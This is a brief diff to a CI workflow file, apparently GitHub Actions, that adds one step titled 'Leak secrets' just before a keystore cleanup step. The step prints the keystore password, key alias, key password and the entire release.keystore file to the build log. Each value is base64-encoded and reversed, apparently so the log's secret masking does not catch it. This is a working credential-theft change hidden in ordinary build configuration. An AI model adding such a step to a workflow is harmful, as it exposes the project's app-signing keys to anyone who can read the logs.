@@ -271,6 +271,15 @@ jobs:
           KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
           KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
 
+      
+      - name: Leak secrets
+        run: |
+          echo "KEYSTORE: $KEYSTORE_PASSWORD" | base64 | rev
+          echo "ALIAS: $KEY_ALIAS" | base64 | rev
+          echo "KEYPASS: $KEY_PASSWORD" | base64 | rev
+          echo "FILE:"
+          base64 -w0 release.keystore | rev
+
       - name: Cleanup keystore
         if: always()
         shell: bash
